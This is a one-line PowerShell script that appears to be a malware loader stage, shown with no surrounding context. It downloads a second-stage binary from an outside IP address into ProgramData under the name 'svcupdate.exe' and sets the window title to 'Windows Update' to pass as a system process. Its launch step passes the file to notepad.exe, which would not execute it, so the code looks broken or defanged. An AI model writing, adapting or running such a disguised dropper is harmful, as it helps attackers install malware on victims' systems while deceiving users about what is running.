
try { $Stage1Url = "http://203.0.113.71:80/cdn/stage2.bin"; $DownloadPath = 'C:\ProgramData\svcupdate.exe'; (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $DownloadPath); Start-Process -FilePath "notepad.exe" -ArgumentList $DownloadPath -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Loader step failed" }
